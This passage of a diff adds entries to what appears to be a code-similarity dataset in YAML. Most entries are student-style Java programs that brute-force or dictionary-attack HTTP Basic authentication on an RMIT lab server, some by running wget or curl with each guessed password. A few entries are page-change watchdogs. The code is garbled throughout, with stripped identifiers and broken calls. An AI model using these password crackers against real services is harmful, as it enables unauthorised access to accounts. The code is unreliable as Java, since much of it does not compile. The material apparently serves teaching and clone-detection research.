+      \      out [ outIndex++ ] = alphabet [ bits6 ]; \n          bits6 = ( bits24 & 0x00000FC0 ) >> 6; \n          out [\
+      \ outIndex++ ] = alphabet [ bits6 ];\n\n         \n          out [ outIndex++ ] = '='; \n        }\n        else if\
+      \ ( octetString.length - i == 1 )\n        {\n          \n          bits24 = ( octetString [ i ] & 0xFF ) << 16;\n\n\
+      \         bits6 = ( bits24 & 0x00FC0000 ) >> 18;\n          out [ outIndex++ ] = alphabet [ bits6 ];\n          bits6\
+      \ = ( bits24 & 0x0003F000 ) >> 12; \n          out [ outIndex++ ] = alphabet [ bits6 ];\n\n         \n          out\
+      \ [ outIndex++ ] = '='; \n          out [ outIndex++ ] = '='; \n        }\n\n       return new String ( out );\n   \
+      \   }\n\n     \n      \n}\n\n\n"
+    - "\nimport java.io.*;\nimport java.net.*;\n\npublic class BruteForce\n{\n\n  public static void  main(String args[])\n\
+      \  {\n    StringWriter sw = new StringWriter();\n    PrintWriter  pw = new PrintWriter();\n    int flag=1;\n    String[]\
+      \ letter = {\"A\",\"B\",\"C\",\"D\",\"E\",\"F\",\"G\",\"H\",\"I\",\"J\",\"K\",\"L\",\"M\",\"N\",\n                 \
+      \       \"O\",\"P\",\"Q\",\"R\",\"T\",\"U\",\"V\",\"W\",\"X\",\"Y\",\"Z\",\"a\",\"b\",\"c\",\n                     \
+      \   \"d\",\"e\",\"f\",\"g\",\"h\",\"i\",\"j\",\"k\",\"l\",\"m\",\"n\",\"o\",\"p\",\"q\",\n                        \"\
+      r\",\"s\",\"t\",\"u\",\"v\",\"w\",\"x\",\"y\",\"z\",\"\"};\n\n    String urlString = new String(\"http://sec-crack.cs.rmit.edu./SEC/2/\"\
+      );\n    String thePassword= new String();\n     stime = System.currentTimeMillis();\nSystem.out.println(\"\");\n   \
+      \ for(int i=0; i<letter.length;i++)\n    {\n      for(int j=0; j<letter.length; j++)\n      {\n        for(int k=0;flag==1\
+      \ && k<letter.length; k++)\n        {\n          try {\n            URL url = new URL (urlString);\n            thePassword=letter[i].trim()+letter[j].trim()+letter[k].trim();\n\
+      \n            String userPassword = \"\" + \":\" + thePassword;\n\n            String encoding = new url.misc.BASE64Encoder().encode(userPassword.getBytes());\n\
+      \            URLConnection uc = url.openConnection();\n            uc.setRequestProperty(\"Authorization\", \" \" +\
+      \ encoding);\n            InputStream content = (InputStream)uc.getContent();\n             endtime = System.currentTimeMillis();\n\
+      \            BufferedReader in   =\n                      new BufferedReader (new InputStreamReader (content));\n  \
+      \          String line;\n            while ((line = in.readLine()) != null) {\n            pw.println (line);\n    \
+      \        }\n            flag=0;\n            System.out.println(\"process time is : \" +(endtime-stime)/1000 +\" seconds.\"\
+      );\n          }catch (MalformedURLException e) {\n\n           flag=1;\n          }catch (IOException e) {\n\n     \
+      \      flag=1;\n          }\n        }\n        if(flag==0)\n          break;\n        else\n         System.out.println(\"\
+      letter j ->\"+ letter[j]+\" elapsed\");\n      }\n      if(flag==0)\n         break;\n      else\n         System.out.println(\"\
+      letter i ->\"+ letter[i]+\" elapsed\");\n    }\n    System.out.println(\"content is \"+ sw.toString());\n   }\n }"
+  - source_sentence: "import java.io.*;\nimport java.net.*;\nimport java.net.HttpURLConnection;\nimport javax.net.*;\nimport\
+      \ java.security.cert.*;\n\npublic class Dictionary\n{\n\tpublic static void main(String[] args)\n\t{\n\t\tBufferedReader\
+      \ in = null;\n\t\tboolean found = true;\n\t\tString word = null;\n\t\tString cmd = null;\n\t\tRuntime run = Runtime.getRuntime();\n\
+      \t\tProcess pro = null;\n\t\tBufferedReader inLine = null;\n\n\n\n\t\tString str = null;\n\t\tURLConnection connection\
+      \ = null;\n\n\t\ttry\n\t\t{\n\t\t\tFileReader reader = new FileReader(\"words\");\n\t\t\tin = new BufferedReader(reader);\n\
+      \t\t\tSystem.out.println(\" cracking....\");\n\t\t\t\n\t\t\t{\n\t\t\t\tfound = true;\n\t\t\t\tword = new String(in.readLine());\n\
+      \n\t\t\t\tcmd = \"wget --http-user= --http-passwd=\"+word +\" http://sec-crack.cs.rmit.edu./SEC/2/index.php\";\n\n\t\
+      \t\t\tpro = run.exec(cmd);\n\t\t\t\tinLine = new BufferedReader(new InputStreamReader(pro.getErrorStream()));\n\n\n\t\
+      \t\t\tif((str=inLine.readLine())!=null)\n\t\t\t\t{\n\n\t\t\t\t\twhile ((str=inLine.readLine())!=null)\n\t\t\t\t\t{\n\
+      \t\t\t\t\t\tif (str.endsWith(\"Required\"))\n\t\t\t\t\t\t{\n\n\t\t\t\t\t\t\tfound = false;\n\t\t\t\t\t\t}\n\n\t\t\t\t\
+      \t}\n\t\t\t\t}\n\n\n\n\n\n\n\t\t\t\trun.gc();\n\t\t\t}\n\t\t\twhile (!found);\n\n\n\n\n\n\t\t}\n\t\tcatch (FileNotFoundException\
+      \ exc)\n\t\t{\n\t\t\tSystem.out.println(exc);\n\t\t}\n\t\tcatch (IOException exc)\n\t\t{\n\t\t\tSystem.out.println(exc);\n\
+      \t\t}\n        catch (NullPointerException ex)\n        {\n            System.out.println(word);\n        }\n\t\tfinally\n\
+      \t\t{\n\t\t\ttry\n\t\t\t{\n\t\t\t\tif (in!= null)\n\t\t\t\t{\n\t\t\t\t\tin.print();\n\t\t\t\t}\n\t\t\t}\n\t\t\tcatch\
+      \ (IOException e) {}\n\t\t}\n\t\tif (found == true)\n\t\t\tSystem.out.println(\"The password is :\" + word);\n     \
+      \   else\n            System.out.println(\"NOT FOUND!\");\n\t}\n}"
+    sentences:
+    - "\n\nimport java.misc.BASE64Encoder;\nimport java.misc.BASE64Decoder;\nimport java.io.*;\nimport java.net.*;\nimport\
+      \ java.util.*;\n\n\n\npublic class Dictionary {\n  \n  public Dictionary(String url, String dictionaryFile) {\n    try{\n\
+      \      this.url = url;\n      this.dictionaryPath = dictionaryFile;\n      InputStream fis = new FileInputStream(this.dictionaryPath);\n\
+      \      dict = new BufferedReader(new InputStreamReader(fis));\n\n    }catch(IOException ioe){\n      System.out.println(\"\
+      Error opening dictionary file:\\n\" +ioe);\n    }\n  }\n\n\n  \n  private String url = null;\n  \n  private String dictionaryPath\
+      \ = null;\n  \n  private BufferedReader dict = null;\n  \n  private int attempts = 0;\n  \n  private int passwordSize\
+      \ = 3;\n  \n  public void setPasswordSize(int size){\n      this.passwordSize = size;\n  }\n  \n  public String getNextPassword()throws\
+      \ IOException{\n\n    String line = dict.readLine();\n\n      while(line!=null&&line.length()!=this.passwordSize )\n\
+      \        line = dict.readLine();\n\n    return line;\n  }\n  \n  public String crackPassword(String user) throws IOException,\
+      \ MalformedURLException{\n    URL url = null;\n    URLConnection urlConnection = null;\n    String outcome = null;\n\
+      \    String  authorization = null;\n    String password = null;\n    BASE64Encoder b64enc = new BASE64Encoder();\n \
+      \   InputStream content = null;\n    BufferedReader in = null;\n\n\n    while(!\"HTTP/1.1 200 OK\".equalsIgnoreCase(outcome)){\n\
+      \n      url = new URL(this.url);\n      urlConnection = url.openConnection();\n      urlConnection.setDoInput(true);\n\
+      \      urlConnection.setDoOutput(true);\n\n\n      urlConnection.setRequestProperty(\"GET\", url.getPath() + \" HTTP/1.1\"\
+      );\n      urlConnection.setRequestProperty(\"Host\", url.getHost());\n      password = getNextPassword();\n      if(password\
+      \ == null)\n        return null;\n      System.out.print(password);\n      authorization = user + \":\" + password;\n\
+      \n\n      urlConnection.setRequestProperty(\"Authorization\", \" \"+ b64enc.encode(authorization.getBytes()));\n\n\n\
+      outcome = urlConnection.getHeaderField(null); \n\n\n\n      this.attempts ++;\n      urlConnection = null;\n      url\
+      \ = null;\n      \n      if(this.attempts%51 == 0)\n        for(int b = 0; b < 53;b++)\n          System.out.print(\"\
+      \\b \\b\");\n      else\n        System.out.print(\"\\b\\b\\b.\");\n\n\n    }\n    return password;\n  }\n  \n  public\
+      \ int getAttempts(){\n    return this.attempts;\n  }\n  public static void main (String[] args) {\n    if(args.length\
+      \ != 3){\n      System.out.println(\"usage: java attacks.Dictionary <url  crack: e.g. http://sec-crack.cs.rmit.edu./SEC/2/>\
+      \ <username: e.g. > <dictionary: e.g. /usr/share/lib/dict/words>\");\n      System.exit(1);\n    }\n\n    Dictionary\
+      \ dictionary1 = new Dictionary(args[0], args[2]);\n    try{\n      Calendar cal1=null, cal2=null;\n      cal1 = Calendar.getInstance();\n\
+      \      System.out.println(\"Cracking started at: \" + cal1.getTime().toString());\n      String password = dictionary1.crackPassword(args[1]);\n\
+      \      if(password != null)\n        System.out.println(\"\\nPassword is: \"+password);\n      else\n        System.out.println(\"\
+      \\nPassword could not  retrieved!\");\n      cal2 = Calendar.getInstance();\n      System.out.println(\"Cracking finished\
+      \ at: \" + cal2.getTime().toString());\n      Date d3 = new Date(cal2.getTime().getTime() - cal1.getTime().getTime());\n\
+      \      System.out.println(\"Total Time taken  crack: \" + (d3.getTime())/1000 + \" sec\");\n      System.out.println(\"\
+      Total attempts : \"  + dictionary1.getAttempts());\n\n    }catch(MalformedURLException mue){\n      mue.printStackTrace();\n\
+      \    }\n\n    catch(IOException ioe){\n      ioe.printStackTrace();\n    }\n  }\n}"
+    - "import java.io.*;\nimport java.net.*;\nimport java.security.*;\nimport java.math.*;\nimport java.*;\nimport java.util.*;\n\
+      \n\npublic class BruteForce\n{\n    public static void main (String args[]) throws Exception {\n\tString retVal = null,\
+      \ StatusCode = \"HTTP/1.1 200 OK\";\n    int found = 0, count = 0, ctrl = 0, flag = 0;\n\n\n          stime = System.currentTimeMillis();\n\
+      \         char[] c = new char[3];\n         System.out.println(\"Cracking password by Brute Force...\");\n\n\t     for(int\
+      \ i=65; ((i<123) && (found == 0)); i++)\n\t     {\n\t       for(int j=65; ((j<123) && (found == 0)); j++)\n\t      \
+      \ {\n\t         for (int k=65; ((k<123) && (found == 0)); k++)\n\t         {\n               try {\n               \
+      \    if (ctrl == 0) {\n                      c[0] = '\\0';\n                      c[1] = '\\0';\n                  \
+      \ } else if ((ctrl == 1) && (flag == 0)) {\n                     c[0] = '\\0';\n                   }\n             \
+      \         c[2] = (char)(k);\n\n\t               \n                   URL yahoo = new URL(\"http://sec-crack.cs.rmit.edu./SEC/2/\"\
+      );\n                   URLConnection yc = yahoo.openConnection();\n\n                   \n                   String\
+      \ authString = \":\" + String.valueOf();\n                   String auth = new bf.misc.BASE64Encoder().encode(authString.getBytes());\n\
+      \                   yc.setRequestProperty(\"Authorization\", \" \" + auth);\n                   count++;\n\n       \
+      \            \n                   BufferedReader in = new BufferedReader(\n                                        \
+      \   new InputStreamReader(\n                                           yc.getInputStream()));\n\n                  \
+      \ String inputLine;\n                   while ((inputLine = in.readLine()) != null){\n                           System.out.println(inputLine);\n\
+      \                            etime = System.currentTimeMillis();\n                           System.out.println(\"Password\
+      \ found -- \" + String.valueOf());\n                           System.out.println(\"Time used = \" + ((etime - stime)/1000)\
+      \ + \" sec\");\n                           System.out.println(\"# of attempt = \" + count);\n                      \
+      \     System.out.println(\"End of cracking!\");\n                           found = 1;\n                   }\n     \
+      \              in.print();\n\n\t           } catch (Exception ex) {}\n\t         }\n\t         ctrl = 1;\n         \
+      \    c[1] = (char)(j);\n           }\n           ctrl = 2;\n           flag = 1;\n           c[0] = (char)(i);\n   \
+      \      }\n         if (found == 0){\n           System.out.println(\"Sorry,  password found.\");\n           System.out.println(\"\
+      # of attempt = \" + count);\n           System.out.println(\"End of cracking!\");\n         }\n    }\n}"
+    - "\n\nimport java.net.*;\nimport java.io.*;\n\nimport java.*;\nimport java.util.*;\n\npublic class Dictionary {\n\n \
+      \ private static String commandLine = \"curl http://sec-crack.cs.rmit.edu./SEC/2/index.php -I -u :\";\n  private String\
+      \ password;             \n  private String previous;             \n  private String url;                  \n  private\
+      \ int startTime;\n  private int endTime;\n  private int totalTime;\n  private float averageTime;\n  private boolean\
+      \ finish;\n  private Process curl;\n  private BufferedReader bf, responseLine;\n\n  public Dictionary() {\n\n  first();\n\
+      \  finish = true;                           \n  previous = \"\";                           \n  Runtime run = Runtime.getRuntime();\n\
+      \  startTime =new Date().getTime();         \n  int i=0;\n  try {\n   try {\n     bf = new BufferedReader(new FileReader(\"\
+      words\"));\n   }\n   catch(FileNotFoundException notFound) {\n    bf  = new BufferedReader(new FileReader(\"/usr/share/lib/dict/words\"\
+      ));\n   }\n\n   while((password = bf.readLine()) != null) {\n    if(password.length()>3) password = password.substring(0,3);\n\
+      \    if(previous.equals(password)) ;\n    else {\n    previous = password;\n    url = commandLine+password;\n    curl=\
+      \ run.exec(url);                   \n    responseLine=new BufferedReader(new InputStreamReader(curl.getInputStream()));\n\
+      \    \n    if(responseLine.readLine().substring(9,12).equals(\"200\")) break;\n    }\n   }\n  }\n  catch(IOException\
+      \ ioe) {\n    System.out.println(\"\\n IO Exception! \\n\");\n    System.out.println(\"The current url is:\"+ url);\n\
+      \    System.out.println(\"The current trying password is:\"+password);\n    finish=false;\n  }\n\n  endTime = new Date().getTime();\
+      \          \n  totalTime = (endTime-startTime)/1000;\n  System.out.println(\"   The response time is:\"+ totalTime +\
+      \ \"  seconds\\n\");\n  if(finish) {\n    System.out.println(\"   The password for  is:\"+ password);\n    try {\n \
+      \   savePassword(password, totalTime);\n    }\n    catch (IOException ioec) {\n       System.out.println(\"  not save\
+      \ the password  file Dictionary_pwd.txt \");\n    }\n  }\n  }\n\n\n  public void savePassword(String passwdString, int\
+      \ time) throws IOException {\n  DataOutputStream outputStream = new DataOutputStream(new FileOutputStream(\"Dictionary_pwd.txt\"\
+      ));\n  outputStream.writeChars(\"The password is:\");\n  outputStream.writeChars(passwdString+\"\\n\");\n  outputStream.writeChars(\"\
+      The response time is: \");\n  outputStream.writeChars(sw.toString(time));\n  outputStream.writeChars(\" seconds\\n\"\
+      );\n  outputStream.close();\n  }\n\n  public void first() {\n\n    System.out.println(\"\\n\\n----------------------------------------------\"\
+      );\n    System.out.println(\"   Use curl command and dictionary \");\n    System.out.println(\"  Brute Force the password\
+      \ for user  \");\n    System.out.println(\"----------------------------------------------\");\n  }\n\n  public static\
+      \ void main(String[] args) {\n   new Dictionary();\n  }  \n}\n"
+  - source_sentence: "\n\nimport java.net.*;\nimport java.io.*;\nimport java.io.BufferedReader;\nimport java.io.InputStream;\n\
+      import java.io.InputStreamReader;\nimport java.io.IOException;\nimport java.io.FileInputStream;\nimport java.io.FileNotFoundException;\n\
+      import java.util.*;\nimport java.*;\n\n\npublic class Dictionary {\n    public static void main(String[] args) throws\
+      \ Exception {\n        String pass;\n        int attempt = 0;\n        String fileName = \"words.txt\", line;\n    \
+      \    BufferedReader reader;\n        Dictionary dict = new Dictionary();\n        boolean flag=false;\n\n        System.out.println(System.currentTimeMillis()/1000);\n\
+      \n      try{\n        reader = new BufferedReader(new InputStreamReader(new FileInputStream(fileName)));\n        while\
+      \ (!flag)\n        {\n            try{\n               line = reader.readLine();\n               attempt++;\n      \
+      \         URL url = new URL(\"http://sec-crack.cs.rmit.edu./SEC/2/\");\n               URLConnection yc = url.openConnection();\n\
+      \               pass = \":\" + line;\n               String password = new url.misc.BASE64Encoder().encode(pass.getBytes());\n\
+      \               yc.setRequestProperty(\"Authorization\",\" \"+password);\n               BufferedReader in = new BufferedReader(new\
+      \ InputStreamReader(yc.getInputStream()));\n               String inputLine;\n               while ((inputLine = in.readLine())\
+      \ != null)\n                   System.out.println(inputLine);\n               in.close();\n               System.out.println(pass);\n\
+      \               flag=true;\n               System.out.println(System.currentTimeMillis()/1000); \n               System.out.println(\"\
+      \ of attempt: \"+attempt);\n               System.exit(0);\n             }catch(IOException e){\n                \n\
+      \             }\n        }  \n      }catch(FileNotFoundException e){\n         System.out.println(\"File not found\"\
+      );\n\n      }\n    }\n}"
+    sentences:
+    - "import java.io.*;\nimport java.net.*;\nimport java.util.*;\n\npublic class Watchdog\n{\n\tpublic static void main(String\
+      \ args[])\n\t{\n\t\t\n\t\tString mainLink=\"http://www.cs.rmit.edu./students/\";\n\t\tString sender = \"@cs.rmit.edu.\"\
+      ;\n\t\tString recipient = \"<webtech@acuneeds.>\";\n\t\tString hostName = \"yallara.cs.rmit.edu.\";\n\t\tint delay =\
+      \ 86400000;\n\n\t\ttry\n\t\t{\n\t\t\tint imgSrcIndex, imgSrcEnd;\n\t\t\tString imgLink;\n\t\t\tVector imageList = new\
+      \ Vector();\n\t\t\tHttpURLConnection imgConnection;\n\t\t\tURL imgURL;\n\n\t\t\t\n\t\t\tEmailClient email = new EmailClient(sender,\
+      \ recipient, hostName);\n\n\t\t\t\n\t\t\tURL url=new URL(mainLink);\n\t\t\tHttpURLConnection connection = (HttpURLConnection)\
+      \ url.openConnection();\n\n\t\t\tBufferedReader webpage = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n\
+      \n\t\t\t\n\t\t\tFileWriter fwrite = new FileWriter(\"local.txt\");\n\t\t\tBufferedWriter writefile = new BufferedWriter(fwrite);\n\
+      \n\t\t\tString line=webpage.readLine();\n\n\t\t\twhile (line != null)\n\t\t\t{\n\t\t\t\t\n\t\t\t\twritefile.write(line,0,line.length());\n\
+      \t\t\t\twritefile.newLine();\n\n\t\t\t\t\n\t\t\t\tline = line.toLowerCase();\n\t\t\t\timgSrcIndex=line.indexOf(\"src\"\
+      );\n\n\t\t\t\tif(imgSrcIndex!=-1)\n\t\t\t\t{\n\t\t\t\t\t\n\t\t\t\t\timgLink = line.substring(imgSrcIndex+3);\n\t\t\t\
+      \t\timgSrcIndex=imgLink.indexOf(\"\\\"\");\n\t\t\t\t\timgLink = imgLink.substring(imgSrcIndex+1);\n\t\t\t\t\timgSrcEnd\
+      \ = imgLink.indexOf(\"\\\"\");\n\t\t\t\t\timgLink = imgLink.substring(0,imgSrcEnd);\n\n\t\t\t\t\t\n\t\t\t\t\tif (imgLink.startsWith(\"\
+      http\"))\n\t\t\t\t\t{\n\t\t\t\t\t\timgURL = new URL(imgLink);\n\t\t\t\t\t\timgConnection = (HttpURLConnection) imgURL.openConnection();\n\
+      \t\t\t\t\t}\n\t\t\t\t\t\n\t\t\t\t\telse\n\t\t\t\t\t{\n\t\t\t\t\t\timgURL = new URL(mainLink);\n\t\t\t\t\t\timgURL =\
+      \ new URL(imgURL, imgLink);\n\t\t\t\t\t\timgConnection = (HttpURLConnection) imgURL.openConnection();\n\t\t\t\t\t\t\
+      imgLink = (imgConnection.getURL()).toString();\n\t\t\t\t\t}\n\n\t\t\t\t\t\n\t\t\t\t\timageList.add(new ImageFile(imgLink,\
+      \ imgConnection.getContentLength()));\n\t\t\t\t\timgConnection.disconnect();\n\t\t\t\t}\n\n\t\t\t\tline = webpage.readLine();\n\
+      \n\t\t\t}\n\n\t\t\t\n\t\t\twritefile.close();\n\t\t\tfwrite.close();\n\t\t\twebpage.close();\n\t\t\tconnection.disconnect();\n\
+      \n\t\t\t\n\t\t\tWatchdogThread watchdog = new WatchdogThread(mainLink, imageList, email, delay);\n\t\t}\n\n\t\tcatch\
+      \ (IOException ioe)\n\t\t{\n\t\t\t\n\t\t\t\n\t\t\tSystem.out.println(ioe);\n\t\t\tSystem.out.println(\"Please run program\
+      \ again.\");\n\t\t\tSystem.exit(0);\n\t\t}\n\n\t}\n\n}\n"
+    - "import java.net.*;\nimport java.io.*;\n\n\npublic class Dictionary {\n  private String strUserName;\n  private String\
+      \ strURL;\n  private String strDictPath;\n  private int iAttempts;\n\n    \n    public Dictionary(String strURL,String\
+      \ strUserName,String strDictPath) {\n    this.strURL = strURL;\n    this.strUserName = strUserName;\n    this.iAttempts\
+      \ = 0 ;\n    this.strDictPath = strDictPath;\n    }\n  \n\n  public String getPassword(){\n      URL u;\n      String\
+      \ result =\"\";\n      PassGenDict PG = new PassGenDict(3,strDictPath);\n      URLConnection uc;\n      String strPassword\
+      \ = new String();\n      String strEncode;\n        try{\n        while (result.compareTo(\"HTTP/1.1 200 OK\")!=0){\n\
+      \      \n          strEncode = PG.getNewPassword();\n          u = new URL(strURL);\n          uc = u.openConnection();\n\
+      \          uc.setDoInput(true);\n          uc.setDoOutput(true);\n          strPassword = strEncode;\n          strEncode\
+      \ =  strUserName + \":\" + strEncode;\n          \n        strEncode = new String(Base64.encode(strEncode.getBytes()));\n\
+      \          uc.setRequestProperty(\"Authorization\",\" \" + strEncode);\n            \n      result = uc.getHeaderField(0);\n\
+      \          uc = null;\n          u = null;\n          iAttempts++;\n        }\n\n      }\n      catch (Exception me)\
+      \ {\n      System.out.println(\"MalformedURLException: \"+me);\n      }\n      return(strPassword);\n  }\n \n   public\
+      \ int getAttempts(){\n    return (iAttempts);\n  };\n  \n  public static void  main(String arg[]){\n     timeStart =\
+      \ 0;\n     timeEnd = 0;\n    \n    if (arg.length == 3) {\n    Dictionary BF = new Dictionary(arg[0],arg[1],arg[2]);\n\
+      \n    System.out.println(\"Processing ... \");\n    timeStart = System.currentTimeMillis();\n    System.out.println(\"\
+      Password = \" + BF.getPassword());\n    timeEnd = System.currentTimeMillis();\n    System.out.println(\"Total Time Taken\
+      \ = \" + (timeEnd - timeStart) + \" (msec)\");\n    System.out.println(\"Total Attempts  = \" + BF.getAttempts());\n\
+      \    }\n    else {\n       System.out.println(\"[Usage] java BruteForce <URL> <USERNAME> <Dictionary path>\");\n\n \
+      \   }\n\n  }\n}\n\n\nclass PassGenDict {\n\n  private char[] password;\n  private String line;\n  int iPassLenght;\n\
+      \  private BufferedReader inputFile;\n  public PassGenDict(int lenght, String strDictPath) {\n    try{\n      inputFile\
+      \ = new BufferedReader(new FileReader(strDictPath));\n    }\n    catch (Exception e){\n    }\n    iPassLenght = lenght;\n\
+      \  }\n   \n public String getNewPassword()\n    throws PasswordFailureException{\n    try {\n      {\n        line =\
+      \ inputFile.readLine();\n      }while (line.length() != iPassLenght);\n\n    }\n    catch (Exception e){\n      throw\
+      \ new PasswordFailureException ();\n    }\n    return (line);\n  }\n}\n\nclass PasswordFailureException extends RuntimeException\
+      \ {\n\n  public PasswordFailureException() {\n  }\n}"
+    - "\n\nimport java.net.*;\nimport java.io.*;\nimport java.util.*;\n\npublic class Dictionary{\n\n  private static URL\
+      \ location;\n  private static String user;\n  private BufferedReader input;\n  private static BufferedReader dictionary;\n\
+      \  private int maxLetters = 3;\n\n  \n\n    public Dictionary() {\n      \n      Authenticator.setDefault(new MyAuthenticator\
+      \ ());\n\n       startTime = System.currentTimeMillis();\n      boolean passwordMatched = false;\n      while (!passwordMatched)\
+      \ {\n        try {\n          input = new BufferedReader(new InputStreamReader(location.openStream()));\n          String\
+      \ line = input.readLine();\n          while (line != null) {\n            System.out.println(line);\n            line\
+      \ = input.readLine();\n          }\n          input.close();\n          passwordMatched = true;\n        }\n       \
+      \ catch (ProtocolException e)\n        {\n          \n          \n        }\n        catch (ConnectException e) {\n\
+      \          System.out.println(\"Failed  connect\");\n        }\n        catch (IOException e) {\n          e.printStackTrace();\n\
+      \          System.exit(-1);\n        }\n      }\n       endTime = System.currentTimeMillis();\n      System.out.println(\"\
+      Total Time: \"+cad.concat(Math.toString(endTime - startTime)));\n    }\n\n    \n\n    private char[] nextPassword()\
+      \ {\n      String password = new String();\n      try {\n        password = dictionary.readLine();\n        while (password.length()\
+      \ > maxLetters) {\n          password = dictionary.readLine();\n        }\n      }\n      catch (IOException e) {\n\
+      \        e.printStackTrace();\n        System.exit(-1);\n      }\n\n      return password.toCharArray();\n    }\n\n\n\
+      \    \n\n    public static void main(String args[]) {\n      if (args.length != 3) {\n        System.out.println(\"\
+      Usage: java Dictionary url user dictionary\");\n        System.exit(-1);\n      }\n      try {\n        location = new\
+      \ URL(args[0]);\n      }\n      catch (MalformedURLException e) {\n        e.printStackTrace();\n      }\n      user\
+      \ = new String().concat(args[1]);\n      try {\n        dictionary = new BufferedReader(new FileReader(args[2]));\n\
+      \      }\n      catch (IOException e) {\n        e.printStackTrace();\n        System.exit(-1);\n      }\n      new\
+      \ Dictionary();\n    }\n\n    \n\n    class MyAuthenticator extends Authenticator {\n      protected PasswordAuthentication\
+      \ getPasswordAuthentication() {\n        char [] currentPassword = nextPassword();\n        System.out.print(user.concat(\"\
+      -\"));\n        System.out.println(currentPassword);\n        return new PasswordAuthentication (user, currentPassword);\n\
+      \      }\n    }\n}\n"
+  - source_sentence: "\n\n\n\n\n\nimport java.io.*;\nimport java.net.*;\n\n\n\npublic class Dictionary\n{\n   public static\
+      \ void main (String args[]) throws IOException,\n   MalformedURLException\n   {\n      final String username = \"\"\
+      ;\n      final String fullurl = \"http://sec-crack.cs.rmit.edu./SEC/2/\";\n      final String dictfile = \"/usr/share/lib/dict/words\"\
+      ;\n      String temppass;\n      String password = \"\";\n      URL url = new URL(fullurl);\n      boolean cracked =\
+      \ false;\n\n       startTime = System.currentTimeMillis();\n\n      \n      BufferedReader r = new BufferedReader(new\
+      \ FileReader(dictfile));\n\n      while((temppass = r.readLine()) != null && !cracked)\n      {  \n         \n     \
+      \    if(temppass.length() <= 3)\n         {\n            \n            if(isAlpha(temppass))\n            {\n      \
+      \         \n               Authenticator.setDefault(new MyAuthenticator(username,temppass));\n               try{\n\
+      \                  BufferedReader x = new BufferedReader(new InputStreamReader(\n                     url.openStream()));\n\
+      \                  cracked = true;\n                  password = temppass;\n               } catch(Exception e){}\n\
+      \            }\n         }\n      }\n\n       stopTime = System.currentTimeMillis();\n      \n      if(!cracked)\n \
+      \        System.out.println(\"Sorry, couldnt find the password\");\n      else\n         System.out.println(\"Password\
+      \ found: \"+password);\n      System.out.println(\"Time taken: \"+(stopTime-startTime));\n   }\n\n   public static boolean\
+      \ isAlpha(String s)\n   {\n      boolean v = true;\n      for(int i=0; i<s.length(); i++)\n      {\n         if(!Character.isLetter(s.charAt(i)))\n\
+      \            v = false;\n      }\n      return ;\n   }\n}\n\n"
+    sentences:
+    - "\n\nimport java.net.*;\nimport java.text.*;  \nimport java.util.*;  \nimport java.io.*;\n\npublic class WatchDog {\n\
+      \n  public WatchDog() {\n\n    StringBuffer stringBuffer1 = new StringBuffer();\n    StringBuffer stringBuffer2 = new\
+      \ StringBuffer();\n    int i,j = 0;\n\n    try{\n\n      URL yahoo = new URL(\"http://www.cs.rmit.edu./students/\");\
+      \ \n      BufferedReader in = new BufferedReader(new InputStreamReader(yahoo.openStream()));\n\n      String inputLine\
+      \ = \"\";\n      String inputLine1 = \"\";\n      String changedtext= \"\";\n      String changedflag= \"\";\n\n\n \
+      \     Thread.sleep(180);\n\n      BufferedReader in1 = new BufferedReader(new InputStreamReader(yahoo.openStream()));\n\
+      \n\n      while ((inputLine = in.readLine()) != null) {\n           inputLine1 = in1.readLine();\n           if (inputLine.equals(inputLine1))\
+      \ {\n              System.out.println(\"equal\");\n           }\n           else {\n              System.out.println(\"\
+      Detected a Change\");\n              System.out.println(\"Line Before the change:\" + inputLine);\n              System.out.println(\"\
+      Line After the change:\" + inputLine1);\n              changedtext = changedtext + inputLine + inputLine1;\n       \
+      \       changedflag = \"Y\";\n           }\n           \n      }\n\n      if (in1.readLine() != null ) {\n         System.out.println(\"\
+      Detected a Change\");\n         System.out.println(\"New Lines Added  \");\n         changedtext = changedtext + \"\
+      New Lines added\";\n         changedflag = \"Y\";\n      }\n\n      in.print();\n      in1.print();\n\n      if (changedflag.equals(\"\
+      Y\")) {\n         String smtphost =\"smtp.mail.rmit.edu.\" ; \n         String from = \"@rmit.edu.\"; \n         String\
+      \  = \"janaka1@optusnet..\" ; \n      }\n\n\n    }\n    catch(Exception e){ System.out.println(\"exception:\" + e);}\n\
+      \t \n}\n\t\t\n    public static void main (String[] args) throws Exception {\n\t\tWatchDog u = new WatchDog();\n   \
+      \ }\n}\n"
+    - "\n\n\n\nimport java.util.*;\nimport java.net.*;\nimport java.io.*;\nimport javax.swing.*;\n\npublic class PasswordCombination\n\
+      {\n    private int      pwdCounter = 0;\n    private   int   startTime;\n    private String   str1,str2,str3;\n    private\
+      \ String   url = \"http://sec-crack.cs.rmit.edu./SEC/2/\";\n    private String   loginPwd;\n    private String[] password;\n\
+      \    private HoldSharedData data;\n    private char[] chars = {'A','B','C','D','E','F','G','H','I','J','K','L','M',\n\
+      \                            'N','O','P','Q','R','S','T','U','V','W','X','Y','Z',\n                            'a','b','c','d','e','f','g','h','i','j','k','l','m',\n\
+      \                            'n','o','p','q','r','s','t','u','v','w','x','y','z'};\n\n    public PasswordCombination()\n\
+      \    {\n        System.out.println(\"Programmed by   for INTE1070 Assignment 2\");\n\n        String input = JOptionPane.showInputDialog(\
+      \ \"Enter number of threads\" );\n        if(  input == null  )\n           System.exit(0);\n\n        int numOfConnections\
+      \ = Integer.parseInt( input );\n        startTime = System.currentTimeMillis();\n        int pwdCounter = 52*52*52 +\
+      \ 52*52 + 52;\n        password = new String[pwdCounter];\n\n\n        loadPasswords();\n        System.out.println(\
+      \ \"Total Number of Passwords: \" + pwdCounter );\n        createConnectionThread( numOfConnections );\n    }\n\n  \
+      \  private void doPwdCombination()\n    {\n        for( int i = 0; i < 52; i ++ )\n        {\n            str1 = \"\"\
+      \ + chars[i];\n            password[pwdCounter++] = \"\" + chars[i];\n            System.err.print( str1 + \" | \" );\n\
+      \n            for( int j = 0; j < 52; j ++ )\n            {\n                str2 = str1 + chars[j];\n             \
+      \   password[pwdCounter++] = str1 + chars[j];\n\n                for( int k = 0; k < 52; k ++ )\n                {\n\
+      \                    str3 = str2 + chars[k];\n                    password[pwdCounter++] = str2 + chars[k];\n      \
+      \          }\n            }\n        }\n    }\n\n    private void loadPasswords( )\n    {\n        FileReader     fRead;\n\
+      \        BufferedReader buf;\n        String         line = null;\n        String         fileName = \"words\";\n\n\
+      \        try\n        {\n            fRead = new FileReader( fileName );\n            buf = new BufferedReader(fRead);\n\
+      \n            while((line = buf.readLine( )) != null)\n            {\n                password[pwdCounter++] = line;\n\
